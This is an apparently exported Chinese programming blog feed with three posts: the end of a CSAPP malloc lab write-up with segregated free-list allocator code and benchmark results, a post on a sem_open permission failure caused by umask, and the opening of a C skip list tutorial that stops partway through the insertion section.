<h5 id="insert-node"><a href="#insert-node" class="headerlink" title="insert_node"></a>insert_node</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">insert_node</span><span class="params">(<span class="type">void</span> *p, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="type">int</span> list_size;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_LIST_NUM; ++i) &#123;</span><br><span class="line">        list_size = (<span class="number">1</span> &lt;&lt; (MIN_INDEX + i));</span><br><span class="line">        <span class="keyword">if</span> (size &gt; list_size) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        insert_node_by_list_index(p, size, i);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="delete-node"><a href="#delete-node" class="headerlink" title="delete_node"></a>delete_node</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">delete_node</span><span class="params">(<span class="type">void</span> *p)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> list_size;</span><br><span class="line">    <span class="type">int</span> size = GET_SIZE(HDRP(p));</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_LIST_NUM; ++i) &#123;</span><br><span class="line">        list_size = (<span class="number">1</span> &lt;&lt; (MIN_INDEX + i));</span><br><span class="line">        <span class="keyword">if</span> (size &lt;= list_size) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 查找每条分离链表，尝试从链表中删除p</span></span><br><span class="line">    <span class="keyword">for</span> ( ; i &lt; MAX_LIST_NUM; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (delete_node_by_list_index(p, size, i)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="coalesace"><a href="#coalesace" class="headerlink" title="coalesace"></a>coalesace</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *p)</span> &#123;</span><br><span class="line">    <span class="type">int</span> prev_alloc = GET_ALLOC(HDRP(PREV_BLKP(p)));</span><br><span class="line">    <span class="type">int</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(p)));</span><br><span class="line">    <span class="type">int</span> size = GET_SIZE(HDRP(p));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev_alloc &amp;&amp; next_alloc) &#123;             <span class="comment">// 前后块均已分配，不可合并</span></span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) &#123;			<span class="comment">// 前面的块已分配，后面的块未分配</span></span><br><span class="line">        delete_node(p);</span><br><span class="line">        delete_node(NEXT_BLKP(p));</span><br><span class="line">        size += GET_SIZE(HDRP(NEXT_BLKP(p)));</span><br><span class="line">        PUT(HDRP(p), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(p), PACK(size, <span class="number">0</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) &#123;		<span class="comment">// 前面的块未分配，后面的块已分配</span></span><br><span class="line">        delete_node(PREV_BLKP(p));</span><br><span class="line">        delete_node(p);</span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(p)));</span><br><span class="line">        PUT(FTRP(p), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(p)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        p = PREV_BLKP(p);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;                                     <span class="comment">// 前后两个块都空闲，一次性合并三个块</span></span><br><span class="line">        delete_node(PREV_BLKP(p));</span><br><span class="line">        delete_node(p);</span><br><span class="line">        delete_node(NEXT_BLKP(p));</span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(p))) + GET_SIZE(HDRP(NEXT_BLKP(p)));</span><br><span class="line">        PUT(FTRP(NEXT_BLKP(p)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(p)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        p = PREV_BLKP(p);</span><br><span class="line">    &#125;</span><br><span class="line">    insert_node(p, size);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="place"><a href="#place" class="headerlink" title="place"></a>place</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 32位系统，块最小为 4 + 2 * 4 + 4 = 16字节</span></span><br><span class="line"><span class="comment">// 64位系统, 块最小为 4 + 2 * 8 + 4 = 24字节</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">place</span><span class="params">(<span class="type">void</span> *p, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="type">int</span> max_size = GET_SIZE(HDRP(p));</span><br><span class="line">    <span class="type">int</span> delta_size = max_size - size;</span><br><span class="line">    delete_node(p);</span><br><span class="line">    <span class="comment">// 如剩余大小少于最小块大小, 不做分割</span></span><br><span class="line">    <span class="keyword">if</span> (delta_size &lt; MIN_BLOCK_SIZE) &#123;</span><br><span class="line">        PUT(HDRP(p), PACK(max_size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(p), PACK(max_size, <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 否则需要分割，并将分割后的空闲块加到空闲链表</span></span><br><span class="line">    PUT(HDRP(p), PACK(size, <span class="number">1</span>));</span><br><span class="line">    PUT(FTRP(p), PACK(size, <span class="number">1</span>));</span><br><span class="line">    PUT(HDRP(NEXT_BLKP(p)), PACK(delta_size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(NEXT_BLKP(p)), PACK(delta_size, <span class="number">0</span>));</span><br><span class="line">    insert_node(NEXT_BLKP(p), delta_size);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="extend-heap"><a href="#extend-heap" class="headerlink" title="extend_heap"></a>extend_heap</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    size = ALIGN(size);</span><br><span class="line">    <span class="type">void</span> *p;</span><br><span class="line">    <span class="keyword">if</span> ((p = mem_sbrk(size)) == (<span class="type">void</span> *)<span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;extend_heap failed! mem_sbrk return -1!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PUT(HDRP(p), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(p), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(HDRP(NEXT_BLKP(p)), PACK(<span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line">    insert_node(p, size);</span><br><span class="line">    <span class="keyword">return</span> coalesce(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="初始化堆-——-mm-init"><a href="#初始化堆-——-mm-init" class="headerlink" title="初始化堆 —— mm_init"></a>初始化堆 —— mm_init</h4><p>调用mm_init后，堆数组结构如下图所示：<br><img src="/2020/09/26/2020-09-26-csapp-malloclab/image8.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 4字节对齐块 + MAX_LIST_NUM * DSIZE字节的空闲链表头指针 + 2个4字节序言块 + 4字节结尾块</span></span><br><span class="line">    <span class="type">char</span> *p = mem_sbrk(MAX_LIST_NUM * <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>) + <span class="number">4</span> * WSIZE);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">void</span> *)p == (<span class="type">void</span> *)(<span class="number">-1</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将所有空闲链表的头指针初始为NULL</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_LIST_NUM; ++i) &#123;</span><br><span class="line">        PUT_P(p + i * <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    p += MAX_LIST_NUM * <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>);</span><br><span class="line"></span><br><span class="line">    PUT(p, <span class="number">0</span>);								<span class="comment">// 4字节对齐块，填0;</span></span><br><span class="line">    PUT(p + WSIZE, PACK(DSIZE, <span class="number">1</span>));			<span class="comment">// 序言块头部，4字节</span></span><br><span class="line">    PUT(p + <span class="number">2</span> * WSIZE, PACK(DSIZE, <span class="number">1</span>));		<span class="comment">// 序言块脚部，4字节</span></span><br><span class="line">    PUT(p + <span class="number">3</span> * WSIZE, PACK(<span class="number">0</span>, <span class="number">1</span>));			<span class="comment">// 结尾快，4字节</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((p = extend_heap(CHUNKSIZE)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="分配块-——-mm-malloc"><a href="#分配块-——-mm-malloc" class="headerlink" title="分配块 —— mm_malloc"></a>分配块 —— mm_malloc</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">mm_malloc</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    size = get_malloc_size(size);	<span class="comment">// 得到调整后的malloc请求大小</span></span><br><span class="line">    <span class="comment">// 寻找空闲链表是否有合适的空闲块。如果没找到合适的空闲块, 需要扩展堆</span></span><br><span class="line">    <span class="type">void</span> *p = find_free_block(size);</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((p = extend_heap(MAX(size, CHUNKSIZE))) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mm_malloc, extend_heap failed!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    p = place(p, size);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="释放块-——-mm-free"><a href="#释放块-——-mm-free" class="headerlink" title="释放块 —— mm_free"></a>释放块 —— mm_free</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mm_free</span><span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line">    PUT(HDRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    <span class="comment">// 将释放后的空闲块重新插入到分离链表中</span></span><br><span class="line">    insert_node(ptr, size);</span><br><span class="line">    coalesce(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="重分配块-——-mm-realloc"><a href="#重分配块-——-mm-realloc" class="headerlink" title="重分配块 —— mm_realloc"></a>重分配块 —— mm_realloc</h4><p>函数原型：<code>void *mm_realloc(void *p, size_t size)</code>， 优化点如下：</p>
<ul>
<li><p>如<code>size</code>小于原来的块大小，简单返回原块即可。</p>
</li>
<li><p>如下一块为空闲块，且<code>空闲块大小 + 原块大小 &gt;= size</code>, 直接合并这两个块。</p>
</li>
<li><p>否则，只能用<code>malloc</code>申请新的空闲块，复制原块，再调用<code>free</code>释放原块</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">mm_realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ptr == <span class="literal">NULL</span> || size == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果realloc请求的size小于原来的大小，简单返回原块</span></span><br><span class="line">    size = get_malloc_size(size);</span><br><span class="line">    <span class="type">int</span> old_size = GET_SIZE(HDRP(ptr));</span><br><span class="line">    <span class="keyword">if</span> (old_size &gt;= size) &#123;</span><br><span class="line">        <span class="keyword">return</span> ptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 考虑下一个块是否空闲块，能否直接合并</span></span><br><span class="line">    <span class="type">int</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(ptr)));</span><br><span class="line">    <span class="type">int</span> next_size = GET_SIZE(HDRP(NEXT_BLKP(ptr)));</span><br><span class="line">    <span class="keyword">if</span> (!next_alloc &amp;&amp; (next_size &gt;= size - old_size)) &#123;</span><br><span class="line">        delete_node(NEXT_BLKP(ptr));</span><br><span class="line">        PUT(HDRP(ptr), PACK(next_size + old_size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(ptr), PACK(next_size + old_size, <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">return</span> ptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只能使用malloc申请新的空闲块，复制原块内容，并调用free释放原块</span></span><br><span class="line">    <span class="type">void</span> *oldptr = ptr;</span><br><span class="line">    ptr = mm_malloc(size);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, oldptr, old_size);</span><br><span class="line">    mm_free(oldptr);</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="实验结果-1"><a href="#实验结果-1" class="headerlink" title="实验结果"></a>实验结果</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># ./mdriver -t traces/ -V</span><br><span class="line">Results for mm malloc:</span><br><span class="line">trace  valid  util     ops      secs  Kops</span><br><span class="line"> 0       yes   99%    5694  0.000886  6430</span><br><span class="line"> 1       yes   99%    5848  0.000793  7379</span><br><span class="line"> 2       yes   99%    6648  0.000903  7359</span><br><span class="line"> 3       yes   99%    5380  0.000749  7182</span><br><span class="line"> 4       yes   66%   14400  0.001754  8212</span><br><span class="line"> 5       yes   96%    4800  0.001114  4308</span><br><span class="line"> 6       yes   95%    4800  0.001112  4317</span><br><span class="line"> 7       yes   55%   12000  0.004104  2924</span><br><span class="line"> 8       yes   51%   24000  0.014884  1612</span><br><span class="line"> 9       yes   87%   14401  0.001490  9667</span><br><span class="line">10       yes   67%   14401  0.001074 13405</span><br><span class="line">Total          83%  112372  0.028862  3893</span><br><span class="line"></span><br><span class="line">Perf index = 50 (util) + 40 (thru) = 90/100</span><br></pre></td></tr></table></figure>

<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《深入理解计算机系统 原书第3版》</p>
<p><a href="https://littlecsd.net/2019/02/14/csapp-Malloclab/">https://littlecsd.net/2019/02/14/csapp-Malloclab/</a></p>
<p><a href="https://www.cnblogs.com/liqiuhao/p/8252373.html">https://www.cnblogs.com/liqiuhao/p/8252373.html</a></p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>sem_open打开信号量失败案例分析</title>
    <url>/2020/11/14/2020-11-14-sem-open-failure-case/</url>
    <content><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>root进程调<code>sem_open(XXX, O_CREAT, 0666, 1)</code>创建信号量后，非root进程使用<code>sem_open</code>打开同一个信号量失败，报<code>Permission Denied</code>错</p>
<h3 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h3><p>非root进程调用<code>sem_open</code>， 以<code>O_CREAT</code>方式打开信号量，需要同时有对该信号量文件的读权限 + 写权限。</p>
<p><code>ll /dev/shm/sem.semname</code> 查看信号量文件权限，发现权限为0644，缺少其他用户写权限。这个权限与sem_open中指定的权限值0666不一致。</p>
<span id="more"></span>

<h4 id="为什么sem-open中mode参数指定的权限-0666-和创建文件的实际权限-0644-不一致？"><a href="#为什么sem-open中mode参数指定的权限-0666-和创建文件的实际权限-0644-不一致？" class="headerlink" title="为什么sem_open中mode参数指定的权限(0666)和创建文件的实际权限(0644)不一致？"></a>为什么sem_open中mode参数指定的权限(0666)和创建文件的实际权限(0644)不一致？</h4><p>首先了解Linux中umask的概念。umask为用户文件创建掩码，是一种进程属性。当进程创建文件或目录时，该属性用于指明应屏蔽的权限位。大多数Linux系统的默认掩码为022，可在shell中通过umask命令查看。umask作用如下：</p>
<ul>
<li>若没有文件掩码，则创建文件的默认权限为0666, 创建目录的默认权限为0777</li>
<li>若使用默认掩码022, 则创建文件的权限为0666 - 0022 &#x3D; 0644, 创建目录的权限为 0777 - 0022 &#x3D; 0755</li>
</ul>
<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>可以在进程调用<code>sem_open</code>之前，修改umask值为0，再创建有其他用户写权限的信号量即可。</p>
<p>系统调用umask()可以将进程的umask值改为mask参数所指定的值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="type">mode_t</span> <span class="title function_">umask</span><span class="params">(<span class="type">mode_t</span> mask)</span>; <span class="comment">//调用总是成功，返回值为进程的前一个umask的值</span></span><br></pre></td></tr></table></figure>

<p>写法参考如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">sem_t</span> *<span class="title function_">SemOpen</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">mode_t</span> mask = umask(<span class="number">0</span>);							<span class="comment">// 取消屏蔽的权限位</span></span><br><span class="line">	<span class="type">sem_t</span> *sem = sem_open(XXX, O_CREAT, <span class="number">0666</span>, <span class="number">1</span>);	<span class="comment">// 创建权限0666的二值有名信号量</span></span><br><span class="line">	umask(mask);									<span class="comment">// 恢复umask的值</span></span><br><span class="line">	<span class="keyword">return</span> sem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《Linux&#x2F;UNIX系统编程手册(上)》 —— 15.4.6 进程的文件模式创建掩码</p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>troubleshooting</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>设计跳表, C语言实现</title>
    <url>/2020/12/05/2020-12-05-design-skiplist-by-c/</url>
    <content><![CDATA[<h3 id="跳跃表简介"><a href="#跳跃表简介" class="headerlink" title="跳跃表简介"></a>跳跃表简介</h3><p>跳跃表是<strong>一种以O(log N)期望时间支持查找、插入、删除操作的、有序的</strong>数据结构。其性能和红黑树相当，且跳跃表实现更为简单。</p>
<h3 id="如何理解”跳跃“二字"><a href="#如何理解”跳跃“二字" class="headerlink" title="如何理解”跳跃“二字"></a>如何理解”跳跃“二字</h3><span id="more"></span>

<ol>
<li>首先，考察一个有序的单链表。如下图所示，该链表由8个元素组成，为了查找元素14，需要依次遍历 2 -&gt; 4 -&gt; 6 -&gt; 8 -&gt; 10 -&gt; 12 -&gt; 14, 共考察7个节点。考察的节点数正比于链表长度，查找的时间复杂度为O(n)，效率很低。</li>
</ol>
<p><img src="/2020/12/05/2020-12-05-design-skiplist-by-c/image1.png"></p>
<ol start="2">
<li><p>为了加快查找速度，可以对单链表进行改造，每隔一个节点新增一个指针，指向它前面两个位置上的节点。所有新增的节点组成一条新的单链表(下图中的链表1)。同样查找元素14，现在只需考察4, 8, 12, 14，共4个节点。<br><img src="/2020/12/05/2020-12-05-design-skiplist-by-c/image2.png"></p>
</li>
<li><p>对链表1做类似的操作，又得到一条新的单链表(下图中的链表2)。此时查找元素14，只需考察8, 12, 14，共3个节点。</p>
</li>
</ol>
<p><img src="/2020/12/05/2020-12-05-design-skiplist-by-c/image3.png"></p>
<p>可以看出，跳跃表是<strong>由多条有序链表组成，支持折半查找</strong>的数据结构。</p>
<h3 id="实现跳跃表"><a href="#实现跳跃表" class="headerlink" title="实现跳跃表"></a>实现跳跃表</h3><p>以下用C语言实现一个简单的跳表。跳表实现要求如下，详细参考：<a href="https://leetcode-cn.com/problems/design-skiplist/">LeetCode 1206 设计跳表</a></p>
<ul>
<li>需实现跳表<strong>创建、查找、插入、删除、释放</strong>等操作，不需实现区间查找。</li>
<li>跳表中的元素类型均为<code>int</code>。</li>
<li>跳表中可以存在多个相同的值。</li>
</ul>
<h4 id="0-数据结构设计"><a href="#0-数据结构设计" class="headerlink" title="0. 数据结构设计"></a>0. 数据结构设计</h4><p>设计<code>SkiplistNode</code>结构表示跳跃表节点，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">SkiplistNode</span> &#123;</span></span><br><span class="line">	<span class="type">int</span> value;							<span class="comment">// 存储值</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">SkiplistLevel</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">SkiplistNode</span> *<span class="title">next</span>;</span></span><br><span class="line">	&#125; level[];							<span class="comment">// 层，这里设计成柔性数组，简化malloc和free操作</span></span><br><span class="line">&#125; SkiplistNode;</span><br></pre></td></tr></table></figure>

<p>设计<code>Skiplist</code>结构持有这些跳跃表节点，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">SkiplistNode</span> *<span class="title">head</span>;</span>			<span class="comment">// 跳跃表表头节点</span></span><br><span class="line">    <span class="type">int</span> length;							<span class="comment">// 跳跃表节点数，获取跳跃表长度的时间复杂度O(1)</span></span><br><span class="line">    <span class="type">int</span> level;							<span class="comment">// 记录跳跃表内，层数最大的那个节点的层数。</span></span><br><span class="line">&#125; Skiplist;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>length</code>表示跳跃表节点数，使得获取跳表长度的时间复杂度降为O(1)。</li>
<li><code>level</code>表示跳表层数，跳表的插入、删除操作需要读取和更新<code>level</code>的值。</li>
</ul>
<p>下图表示一个层数为3的节点：</p>
<p><img src="/2020/12/05/2020-12-05-design-skiplist-by-c/image4.png"></p>
<p>下图表示一个长度为6，层数为4的跳表：</p>
<p><img src="/2020/12/05/2020-12-05-design-skiplist-by-c/image5.png"></p>
<h4 id="1-创建跳跃表"><a href="#1-创建跳跃表" class="headerlink" title="1. 创建跳跃表"></a>1. 创建跳跃表</h4><p>设计<code>Skiplist* skiplistCreate()</code>方法创建跳跃表，要点如下：</p>
<ul>
<li>给Skiplist分配空间，长度初始为0，层高初始为1</li>
<li>创建并初始化跳表的附加头节点，并设置层高为<code>SKIPLIST_MAXLEVEL</code>(32)</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SKIPLIST_MAXLEVEL 32</span></span><br><span class="line"><span class="comment">// 跳表的创建</span></span><br><span class="line">Skiplist* <span class="title function_">skiplistCreate</span><span class="params">()</span> &#123;</span><br><span class="line">    Skiplist *sl = (Skiplist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*sl));</span><br><span class="line">    sl-&gt;length = <span class="number">0</span>;</span><br><span class="line">    sl-&gt;level = <span class="number">1</span>;</span><br><span class="line">    sl-&gt;head = skiplistNodeCreate(SKIPLIST_MAXLEVEL, INT_MIN); <span class="comment">// 初始化表头节点的层高为32</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SKIPLIST_MAXLEVEL; ++i) &#123;</span><br><span class="line">        sl-&gt;head-&gt;level[i].next = <span class="literal">NULL</span>;		<span class="comment">// 初始化表头节点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// helper func</span></span><br><span class="line">SkiplistNode* <span class="title function_">skiplistNodeCreate</span><span class="params">(<span class="type">int</span> level, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">    SkiplistNode *p = (SkiplistNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*p) + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> SkiplistLevel) * level);</span><br><span class="line">    p-&gt;value = value;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-查找"><a href="#2-查找" class="headerlink" title="2. 查找"></a>2. 查找</h4><p>设计<code>bool skiplistSearch(Skiplist* obj, int target)</code>实现跳表的查找。</p>
<p>上面分析过，跳表就是由N条有序链表组成的，所以对跳表的查找相当于<strong>从高到低，依次在N条有序链表中</strong>查找。</p>
<p>举例说明，在下图给出的跳表中，查找元素60，红色箭头表示遍历过程。</p>
<p><img src="/2020/12/05/2020-12-05-design-skiplist-by-c/image6.png"></p>
<p>代码实现如下：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 跳表的查找, 时间复杂度O(logN)</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">skiplistSearch</span><span class="params">(Skiplist* obj, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    SkiplistNode *p = obj-&gt;head;</span><br><span class="line">    <span class="type">int</span> levelIdx = obj-&gt;level - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = levelIdx; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="comment">// 如果第i层节点值小于target, 就沿着当前层继续查找</span></span><br><span class="line">        <span class="keyword">while</span> (p-&gt;level[i].next &amp;&amp; p-&gt;level[i].next-&gt;value &lt; target) &#123;</span><br><span class="line">            p = p-&gt;level[i].next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 第i层未找到该节点, 或者节点值已大于target, 沿着下一层继续查找</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;level[i].next == <span class="literal">NULL</span> || p-&gt;level[i].next-&gt;value &gt; target) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-插入"><a href="#3-插入" class="headerlink" title="3. 插入"></a>3. 插入</h4><p>设计<code>void skiplistAdd(Skiplist* obj, int num)</code>实现跳表的查找，要点如下：</p>
<ul>
<li>新增节点时，确定这个新增节点的层高。</li>
<li>如果新增节点的层数为N，需对这N条单链表分别执行插入操作。</li>
<li>成功插入节点后，注意更新跳表的长度和层高。</li>
</ul>
<h5 id="3-1-如何确定新增节点的层高？"><a href="#3-1-如何确定新增节点的层高？" class="headerlink" title="3.1 如何确定新增节点的层高？"></a>3.1 如何确定新增节点的层高？</h5><p>跳表使用<strong>抛硬币</strong>的思想决定一个新增节点的层高，即有1&#x2F;2的概率层数为1，1&#x2F;4的概率层数为2，1&#x2F;8的概率层数为3，以此类推。 这里实现<code>GetSkipNodeRandomLevel</code>方法，确定新增节点层高，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">GetSkipNodeRandomLevel</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> level = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (rand() &amp; <span class="number">0x1</span>) &#123;					<span class="comment">// 抛硬币思想，随机数为奇数的概率可认为是1/2</span></span><br><span class="line">        ++level;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> min(level,SKIPLIST_MAXLEVEL); 	<span class="comment">// 返回的最大层数不超过32</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

